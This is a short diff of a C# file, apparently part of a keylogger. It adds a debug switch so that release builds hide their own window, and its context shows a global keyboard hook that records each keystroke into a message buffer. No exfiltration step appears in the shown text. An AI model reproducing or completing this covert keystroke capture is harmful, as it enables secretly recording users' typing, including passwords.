@@ -1,4 +1,5 @@
-﻿using System;
+﻿#define DBG
+using System;
 using System.Diagnostics;
 using System.Collections.Generic;
 using System.Windows.Forms;
@@ -279,9 +280,15 @@ class BlockWindows
         {
             WinApi.UnhookWindowsHookEx(keyBoardHook);
         };
-        if (WinApi.FindWindow(null, GetForeWindowTitle()) != IntPtr.Zero)
+        IntPtr win = WinApi.FindWindow(null, GetForeWindowTitle());
+        if (win != IntPtr.Zero)
         {
-            //    ShowWindow(c, 0);
+#if !DBG
+                ShowWindow(win, 0);
+#endif
+#if DBG
+            WinApi.ShowWindow(win, 1);     
+#endif
         }
         t.Interval = 5000;
         t.Tick += (f, a) =>
@@ -364,13 +371,13 @@ class BlockWindows
                             hKL
                         );
 
-                     if (Control.IsKeyLocked(Keys.CapsLock))
+                    if (Control.IsKeyLocked(Keys.CapsLock))
                     {
                      
                     }
 
                     if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift)
-                    { 
+                    {
                     }
                     Message.AddChar(b[0]);
                     Console.WriteLine(Message.Message);
